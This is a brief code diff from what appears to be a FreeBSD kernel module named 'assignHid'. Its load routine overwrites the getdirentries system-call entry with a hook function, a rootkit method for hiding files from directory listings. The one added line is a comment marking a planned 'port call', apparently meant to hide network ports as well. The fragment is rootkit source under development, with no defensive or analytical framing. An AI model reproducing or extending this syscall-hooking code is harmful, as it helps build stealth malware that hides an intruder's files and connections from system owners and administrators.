@@ -395,6 +395,7 @@ load(struct module *module, int cmd, void *arg)
      }
     sx_xunlock(&modules_sx);
     sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+    //need to add port call here
     return(0);
 }
 static moduledata_t assignHid_mod = {
